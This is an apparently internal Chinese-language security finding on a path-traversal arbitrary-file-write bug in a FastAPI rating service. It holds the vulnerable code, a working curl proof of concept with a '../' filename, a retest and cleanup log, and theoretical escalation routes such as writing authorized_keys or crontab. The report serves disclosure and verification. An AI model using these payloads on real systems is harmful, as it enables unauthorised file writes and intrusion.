# skillhub — session-rating-server 路径遍历任意文件写入

> ✅ 利用方式标注：**纯网络攻击复现**。无认证，端口 7800 对外，已从攻击机直接 HTTP 触发并验证写入（`/tmp/external_traversal_proof.txt`）。

## 概览

- **目标**：skillhub（内网 192.168.188.x，SSH 凭据见本地台账）
- **OS**：Ubuntu 24.04.3 LTS（内核 7.0.0-28-generic）
- **受影响服务**：`session-rating-server`（Docker 容器，端口 7800，Python FastAPI）
- **漏洞类型**：路径遍历 → 任意文件写入（CWE-22）
- **根因**：上传/合并接口把用户可控的 `filename` 直接拼进存储路径 `store_dir / filename`，未过滤 `../`，导致写入位置可逃逸出上传目录。

## 证据（代码级）

`/app/server.py`：

`upload_rating` 端点（`POST /api/v1/session_rating`，第 151-156 行）：
```python
tar_filename = file.filename or "upload.tar.gz"   # 用户可控（multipart 文件名）
tar_path = store_dir / tar_filename               # 未过滤 ../
with open(tar_path, "wb") as f:                   # 任意文件写入
```

`merge` 端点（`POST /api/v1/session_rating/merge`，第 210-238 行）：
```python
filename = body.get("filename", "upload.tar.gz")  # 用户可控（JSON）
tar_path = store_dir / filename                   # 未过滤 ../
with open(tar_path, "wb") as out:                 # 任意文件写入
```

（`_safe_extract` 使用 `tar.extractall(..., filter="data")`，Python 3.12+ 的安全过滤能阻止 tar 解压路径逃逸，故 tar zip-slip 不可利用；漏洞在**文件名拼接写入**这一环。）


## 2026-09-10 最小复测记录

> 目的：按“测试虚拟机是否安全”的最小证明原则，仅执行一次无害标记写入，不尝试升级到 RCE，不写敏感位置。

- **目标**：`skillhub`（`192.168.188.x`），服务 `session-rating-server`，HTTP 端口 `7800`。
- **触发方式**：从攻击机直接 HTTP `POST /api/v1/session_rating`，multipart `filename=../../../../tmp/skillhub_history_repro_1789024109.txt`。
- **请求结果**：服务返回 `HTTP_STATUS=200`，响应 `{"status":"ok","id":132,"url":"/api/v1/ratings/132"}`。
- **验证结果**：标记文件不在宿主机 `/tmp`，而在容器 `session-rating-server` 的 `/tmp/skillhub_history_repro_1789024109.txt`；容器内 `id` 为 `uid=0(root) gid=0(root)`，文件列表显示该标记文件存在且大小 `37` bytes。
- **清理结果**：已删除容器内 `/tmp/skillhub_history_repro_1789024109.txt`，并从 `/app/data/ratings.db` 删除本次测试记录 `id=132`；复查输出 `MARKER_CLEANED`。
- **结论**：本轮最小动态复测仍可复现路径遍历任意文件写入，复现方式为**真实网络攻击路径**，影响限定在 `session-rating-server` 容器文件系统内；未验证 RCE 升级链。

## 复现结果：✅ 已复现

```bash
curl -X POST "http://127.0.0.1:7800/api/v1/session_rating" \
  -F 'metadata={"user_id":"poc","session_id":"poc","rating":"5"}' \
  -F 'file=@/tmp/poc_payload.txt;filename=../../../../tmp/skillhub_path_traversal.txt'
```
响应：`{"status":"ok","id":128,"url":"/api/v1/ratings/128"}`

目标容器内验证：
```
$ docker exec session-rating-server ls -la /tmp/skillhub_path_traversal.txt
-rw-r--r-- 1 root root 26 Sep  4 11:56 /tmp/skillhub_path_traversal.txt
$ cat /tmp/skillhub_path_traversal.txt
PATH_TRAVERSAL_POC_MARKER
```

即：攻击者通过 `filename=../../../../tmp/xxx` 把上传内容写到容器内**任意路径**（以 root 属主落盘）。

## 影响与边界

- **认证要求**：`/api/v1/session_rating` 无认证（未观察到鉴权），可直接未授权利用。
- **权限结果**：写入以容器内 root 执行，文件属主 root。
- **升级路径（理论，未在本机复现）**：任意文件写入可写 `/root/.ssh/authorized_keys`（若容器开放 SSH）或写 crontab/站点代码，升级为 RCE/命令执行。本机 session-rating-server 容器内未见 SSH 服务，故未继续验证升级链。
- **影响范围**：限于 session-rating-server 容器文件系统（除非容器挂载了宿主机目录）。

## 置信度

**高（已实证）**：路径遍历任意文件写入已在本机真实复现（`/tmp/skillhub_path_traversal.txt` 落盘、root 属主、内容可控）。仅「升级为 RCE」这一环未验证。
